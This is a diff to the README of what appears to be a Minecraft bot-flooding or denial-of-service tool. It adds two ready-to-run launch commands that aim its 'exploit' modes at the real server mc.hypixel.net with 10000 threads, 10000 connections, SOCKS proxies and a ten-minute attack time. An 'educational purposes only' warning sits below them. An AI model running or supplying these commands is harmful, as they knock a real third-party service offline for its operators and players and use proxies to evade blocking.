@@ -28,5 +28,12 @@ RNick
 bypass3
 bypass2
 ```
+
+## START in Spanish
+```java -jar CIPHER-BOT.jar host=mc.hypixel.net port=25565 protocol=47 exploit=botfucker proxiesFile=socks.txt srvResolve=false srvResolve2=false threads=10000 timeout=1000 attackTime=600 connections=10000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true```
+
+## START Normal
+```java -jar exploitbot.jar host=mc.hypixel.net port=25565 protocol=47 exploit=ExploitBot proxiesFile=socks.txt srvResolve=false srvResolve2=false threads=10000 timeout=1000 attackTime=600 connections=10000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true```
+
 ## WARNING
 * Use this script for educational purposes only or to test your server!
